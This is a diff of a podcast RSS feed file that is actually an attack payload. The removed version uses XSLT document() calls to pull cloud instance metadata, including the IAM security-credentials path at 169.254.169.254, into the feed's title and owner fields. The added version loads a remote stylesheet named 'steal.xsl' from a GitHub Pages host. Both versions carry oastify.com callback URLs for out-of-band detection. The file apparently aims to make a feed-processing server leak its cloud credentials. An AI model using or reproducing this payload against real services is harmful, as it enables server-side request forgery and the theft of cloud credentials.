@@ -1,26 +1,23 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-  <xsl:template match="/">
-    <rss version="2.0" xmlns:itunes="http://www.itunes.apple.com/dtds/podcast-1.0.dtd">
-      <channel>
-        <title><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/></title>
-        <link>https://example.com</link>
-        <description><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/hostname')"/></description>
-        <language>en</language>
-        <itunes:author>Test</itunes:author>
-        <itunes:owner>
-          <itunes:name><xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/></itunes:name>
-          <itunes:email>test@test.com</itunes:email>
-        </itunes:owner>
-        <itunes:explicit>no</itunes:explicit>
-        <itunes:image href="https://via.placeholder.com/3000x3000.jpg"/>
-        <itunes:category text="Technology"/>
-        <item>
-          <title>Episode 1</title>
-          <enclosure url="https://j1lzqdi1pn2prgz3hb9dqqpdc4iv6nuc.oastify.com/ep1.mp3" type="audio/mpeg" length="10000000"/>
-          <guid>ep1</guid>
-        </item>
-      </channel>
-    </rss>
-  </xsl:template>
-</xsl:stylesheet>
+<?xml-stylesheet type="text/xsl" href="https://zombiie404.github.io/Apple-Works-Files/steal.xsl"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.apple.com/dtds/podcast-1.0.dtd">
+  <channel>
+    <title>Test</title>
+    <link>https://example.com</link>
+    <description>Test</description>
+    <language>en</language>
+    <itunes:author>Test</itunes:author>
+    <itunes:owner>
+      <itunes:name>Test</itunes:name>
+      <itunes:email>test@test.com</itunes:email>
+    </itunes:owner>
+    <itunes:explicit>no</itunes:explicit>
+    <itunes:image href="https://via.placeholder.com/3000x3000.jpg"/>
+    <itunes:category text="Technology"/>
+    <item>
+      <title>Episode 1</title>
+      <enclosure url="https://cl1sa62u9gmib9jw14t6aj96wx2oqhe6.oastify.com/ep1.mp3" type="audio/mpeg" length="10000000"/>
+      <guid>ep1-xslt</guid>
+    </item>
+  </channel>
+</rss>
